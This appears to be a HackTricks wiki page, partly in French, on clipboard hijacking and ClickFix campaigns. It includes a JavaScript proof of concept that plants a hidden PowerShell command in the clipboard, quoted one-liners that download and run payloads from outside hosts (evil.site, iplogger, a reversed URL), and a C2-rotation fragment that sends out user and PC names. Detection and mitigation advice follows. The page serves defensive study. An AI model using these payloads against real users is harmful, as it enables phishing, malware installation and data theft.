# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> « Ne collez jamais quelque chose que vous n'avez pas copié vous-même. » – vieux mais toujours valable

## Aperçu

Clipboard hijacking – also known as *pastejacking* – exploite le fait que les utilisateurs copient-collent routinièrement des commandes sans les inspecter. Une page web malveillante (ou tout contexte supportant JavaScript comme une application Electron ou Desktop) place de manière programmatique du texte contrôlé par l'attaquant dans le presse-papiers système. Les victimes sont incitées, généralement par des instructions d'ingénierie sociale soigneusement rédigées, à appuyer sur **Win + R** (boîte de dialogue Run), **Win + X** (Quick Access / PowerShell), ou à ouvrir un terminal et à *coller* le contenu du presse-papiers, exécutant immédiatement des commandes arbitraires.

Parce qu'aucun fichier n'est téléchargé et qu'aucune pièce jointe n'est ouverte, la technique contourne la plupart des contrôles de sécurité des e-mails et du contenu web qui surveillent les pièces jointes, les macros ou l'exécution directe de commandes. L'attaque est donc populaire dans les campagnes de phishing livrant des familles de malware de commodité telles que NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## Preuve de concept JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Les campagnes plus anciennes utilisaient `document.execCommand('copy')`, les plus récentes s'appuient sur l'**Clipboard API** asynchrone (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. User visits a typosquatted or compromised site (e.g. `docusign.sa[.]com`)
2. Le JavaScript **ClearFake** injecté appelle un helper `unsecuredCopyToClipboard()` qui stocke silencieusement un one-liner PowerShell encodé en Base64 dans le presse-papiers.
3. Les instructions HTML disent à la victime : *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` s'exécute, téléchargeant une archive qui contient un exécutable légitime plus une DLL malveillante (classic DLL sideloading).
5. Le loader décrypte des étapes supplémentaires, injecte du shellcode et installe une persistance (par ex. tâche planifiée) – aboutissant finalement à l'exécution de NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemple de chaîne NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (légitime Java WebStart) recherche dans son répertoire `msvcp140.dll`.
* La DLL malveillante résout dynamiquement les APIs avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les décrypte en utilisant une clé XOR roulante `"https://google.com/"`, injecte le shellcode final et décompresse **client32.exe** (NetSupport RAT) dans `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le JScript downloader dans **cscript.exe**
3. Récupère un payload MSI → dépose `libcef.dll` à côté d'une application signée → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Presse-papiers → PowerShell → JS eval → LNK de démarrage avec C2 rotatif (PureHVNC)

Certaines campagnes ClickFix évitent complètement le téléchargement de fichiers et demandent aux victimes de coller un one‑liner qui récupère et exécute du JavaScript via WSH, le persiste, et fait tourner le C2 quotidiennement. Exemple de chaîne observée:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caractéristiques clés
- URL obfusquée inversée à l'exécution pour empêcher une inspection superficielle.
- JavaScript se persiste via un Startup LNK (WScript/CScript), et sélectionne le C2 selon le jour courant — permettant une rotation rapide des domaines.

Fragment JS minimal utilisé pour faire tourner les C2 en fonction de la date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Next stage commonly deploys a loader that establishes persistence and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
